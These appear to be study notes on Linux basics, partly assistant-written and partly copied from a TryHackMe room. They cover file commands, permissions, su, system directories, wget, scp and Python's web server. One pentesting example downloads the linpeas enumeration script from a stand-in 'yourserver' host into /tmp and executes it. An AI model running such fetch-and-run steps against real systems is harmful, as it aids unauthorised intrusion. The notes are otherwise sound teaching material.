

## 🔹 **Creating Files and Folders**

### `touch`

- **Purpose**: Create an empty file.
    
- **Usage**: `touch filename`
    
- **Example**:
    
    ```bash
    touch note
    ```
    
    ✅ This creates a new file named `note`.
    

---

### `mkdir` (Make Directory)

- **Purpose**: Create a new directory (folder).
    
- **Usage**: `mkdir directoryname`
    
- **Example**:
    
    ```bash
    mkdir mydirectory
    ```
    
    ✅ This creates a folder named `mydirectory`.
    

---

## 🔹 **Removing Files and Folders**

### `rm` (Remove)

- **Purpose**: Delete files.
    
- **Usage for files**: `rm filename`
    
- **Usage for directories**: `rm -R directoryname`
    
    - `-R` means **recursive**, so it deletes the folder and everything inside it.
        
- **Examples**:
    
    ```bash
    rm note         # Deletes a file named 'note'
    rm -R mydirectory  # Deletes the folder 'mydirectory' and all its contents
    ```
    

---

## 🔹 **Copying and Moving Files**

### `cp` (Copy)

- **Purpose**: Copy a file or directory.
    
- **Usage**: `cp source destination`
    
- **Example**:
    
    ```bash
    cp note note2
    ```
    
    ✅ This makes a copy of `note` and names it `note2`.
    

---

### `mv` (Move or Rename)

- **Purpose**: Move or rename files and folders.
    
- **Usage**: `mv source destination`
    
- **Examples**:
    
    ```bash
    mv note2 note3        # Renames 'note2' to 'note3'
    mv note3 folder1/     # Moves 'note3' into 'folder1'
    ```
    

---

## 🔹 **Determining File Type**

### `file`

- **Purpose**: Tells you what kind of file it is (text, image, executable, etc.)
    
- **Usage**: `file filename`
    
- **Example**:
    
    ```bash
    file note
    ```
    
    ✅ This might output:  
    `note: ASCII text`  
    This confirms it’s a plain text file, even though it has **no extension**.
    

---

## 🔹 **Key Takeaways**

- Linux doesn't require file extensions, so tools like `file` help you identify file types.
    
- `touch` creates empty files, while `mkdir` creates directories.
    
- `cp` copies, `mv` moves or renames, and `rm` deletes.
    
- Always use `rm -R` cautiously — it deletes directories **and their contents** without warning.
    

---

Would you like a quick cheat sheet or practice exercises for these commands?
---

## 🔐 **Understanding File Permissions**

When you use:

```bash
ls -lh
```

You see something like:

```
-rw-r--r-- 1 cmnatic cmnatic 0 Feb 19 10:37 file1
```

Let’s dissect the important parts.

### 🧩 File Permission Structure:

The **first 10 characters** in each line look like this:

```
-rw-r--r--
```

These represent the file type and permissions:

|Position|Meaning|Example (`-rw-r--r--`)|
|---|---|---|
|1|File type (`-` for file, `d` for directory)|`-` = file|
|2-4|**Owner's** permissions|`rw-` = read, write|
|5-7|**Group's** permissions|`r--` = read only|
|8-10|**Others'** permissions|`r--` = read only|

So `-rw-r--r--` means:

- It’s a file
    
- The owner can read & write
    
- The group can only read
    
- Everyone else can only read
    

### 👥 Ownership Columns:

Still in this line:

```
-rw-r--r-- 1 cmnatic cmnatic 0 Feb 19 10:37 file1
                   ↑       ↑
               Owner   Group
```

- The first `cmnatic` = file owner
    
- The second `cmnatic` = group that has access
    

---

## 🔁 **Switching Between Users with `su`**

### 🔑 Why Switch Users?

Sometimes:

- You need to access or edit files owned by another user
    
- You're troubleshooting as a different user
    
- You need root access for system-level tasks
    

### 👤 Using `su`:

#### Basic Switch:

```bash
su user2
```

- Prompts for `user2`’s password
    
- Keeps the **current shell environment** (you’ll still be in the current directory)
    

#### With Login Shell (`-l` or `--login`):

```bash
su -l user2
```

- Prompts for `user2`’s password
    
- Starts a **fresh shell** as if `user2` just logged in
    
- Changes to `user2`’s home directory
    
- Loads `user2`'s environment variables
    

---

## 📌 Summary

|Concept|Command or Format|Description|
|---|---|---|
|Check permissions|`ls -lh`|Shows readable file info|
|File permission flags|`-rw-r--r--`|Owner, group, others|
|File owner & group|`cmnatic cmnatic`|Who owns and what group can access|
|Switch user|`su user2`|Switch user (no login shell)|
|Switch with login shell|`su -l user2`|Full login as the new user|

---

Would you like help interpreting a specific `ls -lh` output, or maybe practicing permission changes using `chmod` or ownership changes using `chown`?

Great! You're now exploring **important system directories** in Linux, which is essential knowledge — especially for system administration, security, or penetration testing.

Here’s a **clear breakdown** of each directory you mentioned:

---

## 📁 **1. /etc – System Configuration Files**

- 📌 **Purpose**: Contains all **system-wide configuration files**.
    
- 🛠️ Examples of what's inside:
    
    - `/etc/passwd`: List of all system users.
        
    - `/etc/shadow`: Encrypted passwords for users.
        
    - `/etc/sudoers`: Defines who can use `sudo`.
        
    - `/etc/sudoers.d/`: Additional sudo permission config files.
        
- 🔐 **Access**: Typically only writable by root.
    

**Use case**:  
If you want to give a user `sudo` access, you'd edit `/etc/sudoers` using:

```bash
sudo visudo
```

---

## 📁 **2. /var – Variable Data Files**

- 📌 **Purpose**: Stores data that **changes frequently**.
    
- 🔁 Examples of subdirectories:
    
    - `/var/log`: Log files from the system and apps.
        
    - `/var/tmp`: Temp files that persist longer than `/tmp`.
        
    - `/var/backups`: System backups.
        
    - `/var/opt`: Optional software variable data.
        
- 🔍 Important in **monitoring, auditing**, or troubleshooting.
    

**Use case**:  
Check system logs:

```bash
cat /var/log/syslog
```

---

## 📁 **3. /root – Root User’s Home Directory**

- 📌 **Purpose**: This is **root’s own home directory**.
    
- 📍 Located at `/root`, not `/home/root`.
    
- 👑 Accessible **only** by the root user.
    

**Use case**:  
When you're logged in as root (or using `sudo su`), your working directory is:

```bash
/root
```

---

## 📁 **4. /tmp – Temporary Files**

- 📌 **Purpose**: Temporary storage for any user or application.
    
- ⚠️ **Volatile**: Contents are **automatically deleted** at reboot.
    
- ✍️ **World-writable**: Any user can write here.
    

**Use case in pentesting**:  
If you upload or generate files (like enumeration scripts or temporary exploits), placing them in `/tmp` is common:

```bash
cd /tmp
wget http://yourserver/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

## 🔐 Summary Table

|Directory|Meaning|Main Use|Writability|
|---|---|---|---|
|`/etc`|etcetera|System-wide configuration files|Root only|
|`/var`|variable|Logs, backups, temporary/persistent data|Varies (root/service-owned)|
|`/root`|root's home|Home directory for the root user|Root only|
|`/tmp`|temporary|Temporary files for all users|Writable by all, cleared on reboot|

---

Let me know if you'd like to test these directories in a CTF/lab context or need help interpreting something like `/etc/shadow`.




Task 4General/Useful Utilities

**Downloading Files (Wget)**

A pretty fundamental feature of computing is the ability to transfer files. For example, you may want to download a program, a script, or even a picture. Thankfully for us, there are multiple ways in which we can retrieve these files.

 We're going to cover the use of `wget` .  This command allows us to download files from the web via HTTP -- as if you were accessing the file in your browser. We simply need to provide the address of the resource that we wish to download. For example, if I wanted to download a file named "myfile.txt" onto my machine, assuming I knew the web address it -- it would look something like this:

`wget https://assets.tryhackme.com/additional/linux-fundamentals/part3/myfile.txt`

  

**Transferring Files From Your Host - SCP (SSH)**

Secure copy, or SCP, is just that -- a means of securely copying files. Unlike the regular cp command, this command allows you to transfer files between two computers using the SSH protocol to provide both authentication and encryption.

Working on a model of SOURCE and DESTINATION, SCP allows you to:

- Copy files & directories from your current system to a remote system
- Copy files & directories from a remote system to your current system

Provided that we know usernames and passwords for a user on your current system and a user on the remote system. For example, let's copy an example file from our machine to a remote machine, which I have neatly laid out in the table below:

|   |   |
|---|---|
|**Variable**|**Value**|
|The IP address of the remote system|192.168.1.30|
|User on the remote system|ubuntu|
|Name of the file on the local system|important.txt|
|Name that we wish to store the file as on the remote system|transferred.txt|

With this information, let's craft our `scp` command (remembering that the format of SCP is just SOURCE and DESTINATION)

`scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt`

And now let's reverse this and layout the syntax for using `scp` to copy a file from a remote computer that we're not logged into 

|   |   |
|---|---|
|**Variable**|**Value**|
|IP address of the remote system|192.168.1.30|
|User on the remote system|ubuntu|
|Name of the file on the remote system|documents.txt|
|Name that we wish to store the file as on our system|notes.txt|

The command will now look like the following: `scp ubuntu@192.168.1.30:/home/ubuntu/documents.txt notes.txt` 

**  
Serving Files From Your Host - WEB**

Ubuntu machines come pre-packaged with python3. Python helpfully provides a lightweight and easy-to-use module called "HTTPServer". This module turns your computer into a quick and easy web server that you can use to serve your own files, where they can then be downloaded by another computing using commands such as `curl` and `wget`. 

Python3's "HTTPServer" will serve the files in the directory where you run the command, but this can be changed by providing options that can be found within the manual pages. Simply, all we need to do is run `python3 -m  http.server` in the terminal to start the module! In the snippet below, we are serving from a directory called "webserver", which has a single named "file".

Using Python to start a web server

```shell-session
tryhackme@linux3:/webserver# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now, let's use `wget` to download the file using the 10.10.232.60 address and the name of the file. Remember, because the python3 server is running port 8000, you will need to specify this within your wget command. For example:

An example wget command of a web server running on port 8000

```shell-session
tryhackme@mymachine:~# wget http://10.10.232.60:8000/myfile
```

Note, you will need to open a new terminal to use `wget` and leave the one that you have started the Python3 web server in. This is because, once you start the Python3 web server, it will run in that terminal until you cancel it.

Let's take a look in the snippet below as an example:

Downloading a file from our webserver using wget

```shell-session
tryhackme@linux3:/tmp# wget http://10.10.232.60:8000/file

2021-05-04 14:26:16  http://127.0.0.1:8000/file
Connecting to http://127.0.0.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 51095 (50K) [text]
Saving to: ‘file’

file                    100%[=================================================>]  49.90K  --.-KB/s    in 0.04s

2021-05-04 14:26:16 (1.31 MB/s) - ‘file’ saved [51095/51095]
```

**Remember**, you will need to run the wget command in another terminal (while keeping the terminal that is running the Python3 server active). An example of this on the TryHackMe AttackBox is below:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/14de6e0470d50317f3b24f4f9aa9297a.png)  

One flaw with this module is that you have no way of indexing, so you must know the exact name and location of the file that you wish to use. This is why I prefer to use Updog. [What's Updog](https://github.com/sc0tfree/updog)? A more advanced yet lightweight webserver. But for now, let's stick to using Python's "HTTP




